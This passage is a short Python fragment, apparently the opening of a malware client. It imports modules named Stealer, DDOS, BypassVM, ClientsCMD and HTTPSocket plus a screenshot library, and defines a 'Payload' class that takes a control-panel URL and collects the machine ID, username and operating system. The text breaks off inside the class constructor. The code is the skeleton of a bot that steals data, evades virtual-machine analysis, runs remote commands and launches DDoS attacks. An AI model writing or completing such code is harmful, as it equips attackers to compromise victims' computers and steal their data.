import requests, base64, os, time, subprocess, hashlib, re, shutil, sys, webbrowser
import ctypes
import tempfile
from mss import mss

from BypassVM import BypassVM
from ClientsCMD import ClientsCMD
from ComputerCMD import ComputerCMD
from DDOS import DDOS
from HTTPSocket import HTTPSocket
from Stealer import Stealer

class Payload:
    def __init__(self, panelURL):
        self.Y = "|BN|"
        self.pannelUrl = panelURL
        self.machineID = self.gen_machine_id()
        self.username = os.getenv("USERNAME")
        self.operatingSystem = self.find_operating_system()
        self.tempdir = tempfile.gettempdir()

        self.params_for_getCommand = {'id', }

